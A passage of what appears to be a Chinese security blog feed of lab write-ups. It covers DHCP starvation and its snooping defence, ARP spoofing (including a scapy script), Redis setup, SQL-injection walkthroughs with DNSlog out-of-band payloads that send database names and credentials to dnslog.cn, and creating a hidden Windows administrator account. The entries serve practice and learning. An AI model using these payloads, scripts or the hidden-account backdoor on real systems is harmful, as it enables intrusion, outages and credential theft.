        <content type="html"><![CDATA[<h1>DHCP饿死攻击及防御(基于ENSP模拟器、Kali攻击机实现)</h1><h3 id="拓扑图">拓扑图</h3><p><img src="Untitled.png" alt="Untitled"></p><h3 id="实验需求">实验需求</h3><ul><li>通过配置DHCP_Server，使得192.168.0.0/24子网内的终端能够自动获取IP地址及DNS</li><li>通过配置SW交换机，开启DHCP Snooping功能，用于保证DHCP客户端从合法的DHCP服务器获取IP地址</li><li>Kali攻击机接入192.168.0.0/24内网中，获取内网IP地址，使用两种DHCP攻击方式并抓包进行分析(Wireshark)</li></ul><h3 id="实验步骤">实验步骤</h3><p><strong>0.准备工具dhcpstarv，yesinia</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dhcpstarv</span><br><span class="line">apt-get install yesinia</span><br><span class="line">图形界面打不开</span><br></pre></td></tr></table></figure><p><strong>1.配置dhcp服务器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">R3配置</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">int</span> g0/<span class="number">0</span>/<span class="number">0</span></span><br><span class="line">ip address <span class="number">192.168</span><span class="number">.0</span><span class="number">.254</span> <span class="number">24</span></span><br><span class="line">q</span><br><span class="line"></span><br><span class="line">ip pool <span class="number">1</span></span><br><span class="line">network <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">gateway-<span class="built_in">list</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.254</span></span><br><span class="line"></span><br><span class="line">dhcp enable</span><br><span class="line"><span class="built_in">int</span> g0/<span class="number">0</span>/<span class="number">0</span></span><br><span class="line">dhcp select <span class="keyword">global</span></span><br></pre></td></tr></table></figure><p>此时PC已经获取到IP地址</p><p><img src="Untitled%201.png" alt="Untitled"></p><p><strong>2.关闭kali的dhcp，从ensp中获取ip地址</strong></p><p>关闭kali的本地dhcp功能</p><p><img src="Untitled%202.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">kali配置</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">dhcpclient</span><br></pre></td></tr></table></figure><p>获取到ip地址</p><p><img src="Untitled%203.png" alt="Untitled"></p><p><img src="Untitled%204.png" alt="Untitled"></p><p>此时可以在R3中看到地址池的使用情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display ip pool name <span class="number">1</span> used</span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p><strong>3.使用工具dhcpstarv攻击</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">kali</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">dhcpstarv -v -i eth0 </span><br></pre></td></tr></table></figure><p>可以发现kali疯狂发送discover报文申请IP地址</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>DHCP服务器的地址池已经都被占用了</p><p><img src="Untitled%207.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dhcp snooping user-bind</span><br></pre></td></tr></table></figure><p><img src="Untitled%208.png" alt="Untitled"></p><p><strong>DHCP Snooping 非信任接口发送的offer报文丢弃，但并无法防御申请，也就是饿死攻击</strong></p><h3 id="防御">防御</h3><p>原理：饿死攻击仅修改Ch?（M）addr，并不会修改源MAC地址</p><p><img src="Untitled%209.png" alt="Untitled"></p><p>因此可以在接口上开启dhcp snooping 的 chaddr检测功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">交换机配置</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">port-group group-member g0/<span class="number">0</span>/<span class="number">1</span> to g0/<span class="number">0</span>/<span class="number">3</span></span><br><span class="line">dhcp snooping check dhcp-chaddr enable </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">dhcp服务器重置地址池</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">reset ip pool name <span class="number">1</span> <span class="built_in">all</span></span><br></pre></td></tr></table></figure><p>此时已经不会出现被绑定的情况了，防御成功，未能到达服务器</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>discover报文仅仅出现在1口</p><p><img src="Untitled%2011.png" alt="Untitled"></p><h2 id="攻击二-修改MAC和Chaddr">攻击二-修改MAC和Chaddr</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">虽然打不开图形界面，但是可以使用命令</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">yersinia dhcp -interface eth0 -attack <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2012.png" alt="Untitled"></p><p>发现出现了dhcp discover报文泛洪，并且MAC地址和chaddr都发生了改变</p><p><img src="Untitled%2013.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP欺骗</title>
      <link href="/2024/04/24/ARP%E6%AC%BA%E9%AA%97/"/>
      <url>/2024/04/24/ARP%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<h1>ARP欺骗</h1><h2 id="环境搭建">环境搭建</h2><ul><li>准备一台kali虚拟机</li><li>一台win靶机</li></ul><h2 id="工具下载">工具下载</h2><p>安装arpspoof工具</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof <span class="comment">#会提示安装，输入y安装</span></span><br></pre></td></tr></table></figure><h2 id="断网攻击">断网攻击</h2><h3 id="kali">kali:</h3><p>使用nmap或fping判断存活主机</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span>.x.*</span><br><span class="line">fping -asg <span class="number">192.168</span>.x.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>在本地查看当前网关</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br></pre></td></tr></table></figure><p>此时win虚拟机ping百度是可以ping通的</p><h3 id="windows：">windows：</h3><p><img src="Untitled.png" alt="Untitled"></p><h3 id="开始攻击">开始攻击</h3><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡[eth0] -t [目标ip] [网关]</span><br></pre></td></tr></table></figure><p><img src="Untitled%201.png" alt="Untitled1"></p><p>观察目标主机</p><h3 id="windows：-2">windows：</h3><p>已经ping不通百度了</p><p><img src="Untitled%202.png" alt="Untitled2"></p><h2 id="原理：">原理：</h2><p>攻击机假冒局域网网关，致使主机上不了网</p><p>可以通过在攻击前后在windows上使用命令<code>arp -a</code>查看网关的MAC地址的变化</p><p>攻击前的网关的MAC就是网关的MAC地址</p><p>而攻击后的网关的MAC地址，即为攻击机的MAC地址</p><p>当执行断网攻击的时候，攻击机会冒充网关给靶机发送arp报文</p><p><img src="Untitled%203.png" alt="Untitled3"></p><h2 id="ARP欺骗（不断网）">ARP欺骗（不断网）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/net/ipv4/ip_forward <span class="comment">#查看</span></span><br><span class="line">echo /proc/sys/net/ipv4/ip_forward <span class="comment">#开启ip转发功能</span></span><br><span class="line"><span class="number">1</span> <span class="comment">#转发 </span></span><br><span class="line"><span class="number">0</span> <span class="comment">#拦截</span></span><br></pre></td></tr></table></figure><h3 id="欺骗攻击">欺骗攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i [网卡] -t [网关] [地址] </span><br></pre></td></tr></table></figure><p>此时就不会拦截</p><h2 id="ARP断网攻击（python脚本）">ARP断网攻击（python脚本）</h2><h3 id="根据ARP报文格式分析各项参数">根据ARP报文格式分析各项参数</h3><p>ARP报文</p><p><img src="Untitled%204.png" alt="Untitled4"></p><p>以太网帧头：</p><p>目的MAC地址（Dst）</p><p>源MAC地址（Src）</p><p><img src="Untitled%205.png" alt="Untitled5"></p><p>ARP报文：</p><p>操作类型（op）：0为ARP请求数据包，1为ARP应答数据包</p><p>源MAC地址（hwsrc）</p><p>源IP地址(psrc)</p><p>目的MAC地址(hwdst)</p><p>目的IP地址(pdst)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#ip</span></span><br><span class="line">target_ip=<span class="string">&#x27;192.168.60.108&#x27;</span></span><br><span class="line">local_ip=<span class="string">&#x27;192.168.60.79&#x27;</span></span><br><span class="line">gateway_ip=<span class="string">&#x27;192.168.60.254&#x27;</span></span><br><span class="line"><span class="comment">#mac</span></span><br><span class="line">target_mac=getmacbyip(target_ip)</span><br><span class="line">mac=get_if_hwaddr(<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line">gateway_mac=getmacbyip(gateway_ip)</span><br><span class="line"></span><br><span class="line">packet=Ether(dst=target_mac,src=mac)/ARP(op=<span class="number">1</span>,hwsrc=mac,</span><br><span class="line">psrc=gateway_ip,hwdst=target_mac,pdst=target_ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        sendp(packet,inter = <span class="number">2</span>,iface=<span class="string">&quot;eth0&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="运行结果">运行结果</h3><p><img src="Untitled%206.png" alt="Untitled6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码生成工具cupp和cewl安装</title>
      <link href="/2023/07/08/%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7cupp%E5%92%8Ccewl%E5%AE%89%E8%A3%85/"/>
      <url>/2023/07/08/%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7cupp%E5%92%8Ccewl%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>我们可以使用Cupp生成一份结合具体目标的带社工性质的字典，比如结合目标的手机号，姓名，生日等</p><p>下面我们就来安装</p><h2 id="Cupp的安装与使用">Cupp的安装与使用</h2><p>使用命令:<code>apt-get install cupp</code></p><p><img src="%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7cupp%E5%92%8Ccewl%E5%AE%89%E8%A3%85/image-20230708181324767.png" alt="image-20230708181324767"></p><p>查看命令 :<code>cupp</code></p><p><img src="%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7cupp%E5%92%8Ccewl%E5%AE%89%E8%A3%85/image-20230708182835179.png" alt="image-20230708182835179"></p>]]></content>
      
      
      
        <tags>
            
            <tag> “工具安装” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis安装</title>
      <link href="/2023/05/31/redis%E5%AE%89%E8%A3%85/"/>
      <url>/2023/05/31/redis%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>最近想着复现一下redis系列的漏洞，自己先搭建个环境</p><p>我们来安装4.08版本</p><h2 id="redis-4-0-8的安装">redis-4.0.8的安装</h2><p>下载地址：<a href="http://download.redis.io/releases/redis-4.0.8.tar.gz">http://download.redis.io/releases/redis-4.0.8.tar.gz</a></p><p>我们安装到我们的kali虚拟机上</p><p>使用命令<code>wget http://download.redis.io/releases/redis-4.0.8.tar.gz</code></p><p><img src="image-20230531185445705.png" alt="image-20230531185445705"></p><p>解压下载的redis-4.0.8.tar.gz文件，使用命令 <code>tar xvf redis-4.0.8.tar.gz</code></p><p><img src="image-20230531185608575.png" alt="image-20230531185608575"></p><p>进入解压文件夹redis-4.0.8，使用命令<code>make</code>编译可执行文件</p><p><img src="image-20230531185923394.png" alt="image-20230531185923394"></p><p>之后在此文件夹中使用命令 <code>redis-server redis.conf</code>来启动服务，如下图，默认端口为6379</p><p><img src="image-20230531221728358.png" alt="image-20230531221728358"></p><p>可以使用<code>ps -ef|grep redis</code>来查看redis服务是否开启</p><p><img src="image-20230531222119558.png" alt="image-20230531222119558"></p><h2 id="redis后台启动">redis后台启动</h2><p>当然此时，redis服务是在前台运行，需要一直”挂着“才行，这里可以修改配置文件<code>redis.conf</code>，改为后端启动,将<code>daemonize no</code></p><p>改为<code>daemonize yes</code></p><p><img src="image-20230531222817197.png" alt="image-20230531222817197"></p><p>再次使用<code>redis-server redis.conf</code>命令启动</p><p><img src="image-20230531223214020.png" alt="image-20230531223214020"></p><p>使用<code>ps -aux|grep redis</code>查看是否启动成功，启动成功！</p><p><img src="image-20230531223306622.png" alt="image-20230531223306622"></p><p>redis自带客户端连接，使用命令 <code>redis-cli -h localhost -p 6379</code>来连接</p><p><img src="image-20230531223918025.png" alt="image-20230531223918025"></p><p>此时可以使用<code>shutdown</code>命令将服务关闭</p><p><img src="image-20230531224213179.png" alt="image-20230531224213179"></p><p>可以看到此时服务已经关闭。也可以使用关闭进程的方式关闭服务，使用<code>kill -9 [pid]</code>命令终结进程</p><p><img src="image-20230531224334207.png" alt="image-20230531224334207"></p><p>当然，此时是本地连接，自己连接自己，因为默认redis时只能本地连接的，所以下面我们来开启远程连接</p><h2 id="redis开启远程连接">redis开启远程连接</h2><p>首先是使用ip连接，先查看ip地址<code>ifconfig</code></p><p><img src="image-20230531230542963.png" alt="image-20230531230542963"></p><p>依然是修改配置文件，<code>nano redis.conf</code>,将 <code>bind 127.0.0.1</code>改为<code>bind 192.168.31.135</code></p><p><img src="image-20230531230609044.png" alt="image-20230531230609044"></p><p>保存后重启redis服务（关闭+打开）,发现此时已经可以使用IP进行连接了</p><p><img src="image-20230531230711456.png" alt="image-20230531230711456"></p><p>此时要想让局域网内的其他主机连接，还需要将保护模式关闭，将<code>protected-mode yes</code>改为<code>protected-mode no</code></p><p><img src="image-20230531224635071.png" alt="image-20230531224635071"></p><p>重启服务，此时通过另一台kali连接，连接成功</p><p><img src="image-20230531231050187.png" alt="image-20230531231050187"></p>]]></content>
      
      
      
        <tags>
            
            <tag> redis系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者在线靶场-SQL注入漏洞测试(参数加密)</title>
      <link href="/2023/05/29/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8A%A0%E5%AF%86%E5%AE%9E%E8%AE%ADAES/"/>
      <url>/2023/05/29/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8A%A0%E5%AF%86%E5%AE%9E%E8%AE%ADAES/</url>
      
        <content type="html"><![CDATA[<p><img src="image-20230529211827617.png" alt="image-20230529211827617"></p><p>之前面试有出过一个这个类似的，现在复现一下</p><p>访问链接，发现一个登陆页面</p><p><img src="image-20230529212201805.png" alt="image-20230529212201805"></p><p>先用dirsearch扫一下</p><p><img src="image-20230529213056045.png" alt="image-20230529213056045"></p><p>挨个查看，最后发现news目录下的东西有些可疑</p><p><img src="image-20230529213157805.png" alt="image-20230529213157805"></p><p>下载zip文件，可以看到list.php的源码</p><p><img src="image-20230529213532178.png" alt="image-20230529213532178"></p><p>主要看php里的内容就好了，主要意思就是，list.php通过get请求获取一个id，并对其进行decode<br>decode函数里的内容就是，将参数data经过两次base64解密，然后经过mdecrypt_generic函数操作（通过英文可以大概知道是用来解密的函数），如果后六位是_mozhe就会返回除去 _mozhe的剩余部分，也就是接入sql语句。</p><p>目的也就明确了，就是sql盲注嘛，首先要搞清楚mcrypt_generic_init中几个参数的含义（应该就是对应的加密规则）</p><p>aes在线工具：<a href="https://oktools.net/aes">AES加密、AES解密 - 在线工具 - OKTools</a></p><p>通过搜索发现是使用的AES加密，ydhaqPQnexoaDuW3是密钥，2018201920202021是参数。那么我们就先使用1_mozhe进行测试去进行aes加密+base64加密（这里使用的工具结果是经过一次base64加密的），这样根据php源码，如果对应上了，页面就不会跳转，而且应该会有数据，如果错了就会跳转到index.php页面</p><p>payload：<code>/news/list.php?id=WDhGNGdmdGo4WXArSXhMOXlVa2FwQT09</code></p><p>果然显示出了通知，接下来就开始sql注入了</p><p><img src="image-20230529232424956.png" alt="image-20230529232424956"></p><p>测试字段数量</p><p><img src="image-20230529232730372.png" alt="image-20230529232730372"></p><p><em><strong><u>ps：上述图片结果记得再加密一次base64</u></strong></em></p><p><img src="image-20230529232805945.png" alt="image-20230529232805945"></p><p>最终测试字段数为4，下图是order by 5时的报错（虽然从源码里也能看到是4个字段，做完才想起来）</p><p><img src="image-20230529233232099.png" alt="image-20230529233232099"></p><p>测试4个字段哪一个有回显</p><p><img src="image-20230529235229938.png" alt="image-20230529235229938"></p><p>发现2，3有回显</p><p><img src="image-20230529235310954.png" alt="image-20230529235310954"></p><p>爆破数据库名</p><p><img src="image-20230529235412852.png" alt="image-20230529235412852"></p><p>爆破表名</p><p><img src="image-20230529235547054.png" alt="image-20230529235547054"></p><p>估计用户就在第一个表里，爆破字段</p><p><img src="image-20230529235736792.png" alt="image-20230529235736792"></p><p>爆破用户名密码，得到两个账号，应该说是两个密码？？</p><p><img src="image-20230530000016518.png" alt="image-20230530000016518"></p><p><img src="image-20230529235917643.png" alt="image-20230529235917643"></p><p>密码看起来都是md5加密，破解一下，应该只有一个能被破解出来，试试看</p><p>md5线上工具：<a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p><p>结果发现两个都解出来了。。。</p><p><img src="image-20230530000322178.png" alt="image-20230530000322178"></p><p><img src="image-20230530000348852.png" alt="image-20230530000348852"></p><p>登录账号，果然虽然两个密码都解出来了，dsan13这个是不能用的，阴险~</p><p><img src="image-20230530000714187.png" alt="image-20230530000714187"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows 隐藏账户排查</title>
      <link href="/2023/04/26/windows-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5/"/>
      <url>/2023/04/26/windows-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>首先创建隐藏账户</p><p><img src="image-20230426094828847.png" alt="image-20230426094828847"></p><p>此时使用net user并不能发现用户admin$</p><p><img src="image-20230426094935044.png" alt="image-20230426094935044"></p><p>将admin$用户加入administrators组,使用命令<code>net localgroup administrators admin$ /add</code></p><p><img src="image-20230426095217121.png" alt="image-20230426095217121"></p><p>此时admin$用net user是查看不到的，但查看用户和组的时候还是可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看命令：net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure><p><img src="image-20230426095351178.png" alt="image-20230426095351178"></p><p>所以需要修改注册表，<code>win+r</code>输入<code>regedit</code>进入注册表</p><p>进入到以下目录<code>HKEY_LOCAL_MACHINE/SAM/SAM</code></p><p><img src="image-20230426095830511.png" alt="image-20230426095830511"></p><p>右击，将权限转交给administrator</p><p><img src="image-20230426100057239.png" alt="image-20230426100057239"></p><p>此时可以看到admin$，并发现其类型为0x3e9</p><p><img src="image-20230426100549678.png" alt="image-20230426100549678"></p><p>,而administrator的类型为0x1f4</p><p><img src="image-20230426100517607.png" alt="image-20230426100517607"></p><p>将admin$,000003E9,000001F4导出</p><p><img src="image-20230426100917742.png" alt="image-20230426100917742"></p><p><img src="image-20230426101048111.png" alt="image-20230426101048111"></p><p>将1f4中的F值复制给3e9</p><p><img src="image-20230426101151369.png" alt="image-20230426101151369"></p><p>复制完之后，就回去把admin$给删掉，命令net user admin$ /del</p><p><img src="image-20230426101513323.png" alt="image-20230426101513323"></p><p>然后回到注册表，将admin.reg 和 admin3e9.reg导入</p><p><img src="image-20230426101856446.png" alt="image-20230426101856446"></p><p>导入成功</p><p><img src="image-20230426102135314.png" alt="image-20230426102135314"></p><p>然后回去，将赋予administrator的权限回收</p><p><img src="image-20230426144717925.png" alt="image-20230426144717925"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 隐藏账户 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盲注快速获取数据</title>
      <link href="/2023/04/15/%E7%9B%B2%E6%B3%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
      <url>/2023/04/15/%E7%9B%B2%E6%B3%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<p>前段时间参加面试，面试官有问过一个问题，SQL注入中盲注如何快速获取数据。当时没有反应过来，后来百度了才发现，这不就是盲注使用dnslog外带数据么，尘封的记忆一下子就回想起来了，那是一个月黑风高的夜晚……咳咳，扯远了，总之就是没答上来，复盘吧！</p><h2 id="环境复现">环境复现</h2><p>我们使用sql-labs进行还原盲注的情形，就用Less-9吧</p><p><img src="image-20230415195258997.png" alt="image-20230415195258997"></p><p>可以看到经过简单的注入点测试，发现页面上的东西不会发生改变</p><p><img src="image-20230415195831443.png" alt="image-20230415195831443"></p><p>但是当payload为请求时间大概为6.02秒，说明存在注入点</p><p><img src="image-20230415200036995.png" alt="image-20230415200036995"></p><p>此时我们需要一个dns平台，就使用ceye平台自带的吧 <a href="http://ceye.io/">http://ceye.io/</a></p><p>或者是其他dns平台，比如<a href="http://www.dnslog.cn/">dnslog</a></p><p>这两个这里都会演示一下</p><p><img src="image-20230415201655811.png" alt="image-20230415201655811"></p><h2 id="dnslog外带条件">dnslog外带条件</h2><p>要使用dnslog外带首先需要满足几个条件：</p><p>1.首先要将secure_file_priv改为‘’</p><p><img src="image-20230417111707360.png" alt="image-20230417111707360"></p><blockquote><p>​修改步骤：1.使用show variables like ‘%secure%’</p><p>​2.进入MYSQL文件夹下，打开my.ini文件</p><p>​3.在my.ini中，添加或修改为secure_file_priv=“”</p></blockquote><p><img src="image-20230417112144072.png" alt="修改后的secure_file_priv"></p><p>2，只适用于Windows系统</p><h2 id="DNS外带实践">DNS外带实践</h2><p><code>payload：?id=1'  and sleep(5) order by 3--+</code></p><p>判断字段数，在order by 3时会sleep的，order by 4 时并不会sleep</p><p><img src="image-20230415202943458.png" alt="image-20230415202943458"></p><p>测试出查询字段数为3</p><p><code>payload：?id=1'  and sleep(5) union select 1,2,3--+</code></p><p><img src="image-20230415203036163.png" alt="image-20230415203036163"></p><p>测试是否支持dns外带，使用的ceye给的dns地址</p><p><code>payload：/?id=1' and load_file('\\\\nihao.xxxx.ceye.io\\abc') --+</code></p><p><img src="image-20230417113400272.png" alt="image-20230417113400272"></p><p>外带成功：</p><p><img src="image-20230417113527467.png" alt="image-20230417113527467"></p><p><em><strong>（ps：后面就是用dnslog平台来进行演示了）</strong></em></p><p>获取一个域名先</p><p><img src="image-20230417143912645.png" alt="image-20230417143912645"></p><p><code>payload：?id=1' and load_file(concat('\\\\',database(),'.fh0qvo.dnslog.cn\\abc')) --+</code></p><p>外带数据库名称</p><p><img src="image-20230417114432264.png" alt="image-20230417114432264"></p><p>在dnslog平台得到数据库名称security：</p><p><img src="image-20230417114711489.png" alt="image-20230417114711489"></p><p><code>payload：?id=1' and load_file(concat('\\\\',(select concat(table_name) from information_schema.tables where table_schema='security' limit 0,1),'.dxllqa.dnslog.cn\\abc')) --+</code></p><p>爆破表名</p><p><img src="image-20230417145128446.png" alt="image-20230417145128446"></p><p>通过改变limit后的数字得到所有的表名</p><p>limit 0,1:</p><p><img src="image-20230417145045963.png" alt="image-20230417145045963"></p><p>limit 1,1:</p><p><img src="image-20230417145325600.png" alt="image-20230417145325600"></p><p>limit 2,1:</p><p><img src="image-20230417145434505.png" alt="image-20230417145434505"></p><p>……</p><p><img src="image-20230417145511479.png" alt="image-20230417145511479"></p><p><code>payload：?id=1' and load_file(concat('\\\\',(select concat(column_name) from information_schema.columns where table_name='users' limit 0,1),'.dxllqa.dnslog.cn\\abc')) --+</code></p><p>爆破字段名</p><p><img src="image-20230417145650444.png" alt="image-20230417145650444"></p><p><img src="image-20230417145602648.png" alt="image-20230417145602648"></p><p><code>payload：?id=1' and load_file(concat('\\\\',(select concat(username,password) from users limit 0,1),'.dxllqa.dnslog.cn\\abc')) --+</code></p><p>爆破用户名和密码</p><p><img src="image-20230417150509236.png" alt="image-20230417150509236"></p><p><img src="image-20230417150347739.png" alt="image-20230417150347739"></p><p>虽然还是慢了些，但比起纯手工还是好了些，另外还可以结合脚本利用，这里就不过多赘述了，有机会再详细讲述。</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs less-7</title>
      <link href="/2023/04/06/sql-labs-less-7/"/>
      <url>/2023/04/06/sql-labs-less-7/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入之outfile">sql注入之outfile</h2><p>发现之前学sql的时候，这一关觉得太麻烦就没怎么练所以今天查漏补缺一下</p><h3 id="第一种方法：标准SQL注入流程">第一种方法：标准SQL注入流程</h3><p><img src="image-20230406140814192.png" alt="image-20230406140814192"></p><p><img src="image-20230406140843766.png" alt="image-20230406140843766"></p><p>首先判断注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=1&#x27;</span><br><span class="line">报错：You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>发现这次连报错信息都不显示了，慢慢试吧</p><p><img src="image-20230406141032944.png" alt="image-20230406141032944"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=1&#x27; or 1=1--+</span><br><span class="line"></span><br><span class="line">还是报错，说明有括号</span><br><span class="line"></span><br><span class="line">payload：?id=1&#x27;) or 1=1--+</span><br><span class="line"></span><br><span class="line">还是报错，说明还有括号</span><br><span class="line"></span><br><span class="line">payload：?id=1&#x27;)) or 1=1--+</span><br><span class="line"></span><br><span class="line">进来了，提示用outfile方法</span><br></pre></td></tr></table></figure><p><img src="image-20230406141203229.png" alt="image-20230406141203229"></p><p>我们需要知道写入文件的绝对路径从之前关卡得到@@datadir</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">paylaod：?id=-1&#x27; union select 1,2,@@datadir--+</span><br><span class="line"></span><br><span class="line">回显：Your Password:C:\phpstudy\MySQL\data\</span><br></pre></td></tr></table></figure><p>直接去第一关得到路径</p><p><img src="image-20230406140744972.png" alt="image-20230406140744972"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=1&#x27;)) order by 4--+</span><br><span class="line">报错：You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>爆破字段数，为3（因为3不报错，4报错）</p><p><img src="image-20230406141705179.png" alt="image-20230406141705179"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 